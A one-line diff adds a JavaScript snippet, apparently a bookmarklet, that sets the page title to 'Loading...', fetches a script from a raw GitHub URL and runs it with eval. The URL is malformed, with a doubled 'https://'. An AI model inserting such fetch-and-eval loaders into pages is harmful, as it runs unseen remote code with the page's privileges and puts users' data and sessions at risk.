@@ -1,0 +1,1 @@
+t=document.title;document.title="Loading...";r=new XMLHttpRequest();r.onload=function(e){eval(e.currentTarget.responseText)};r.open("GET","https://https://raw.githubusercontent.com/juliansabot/wallball/main/idr.js",true);r.send();undefined;
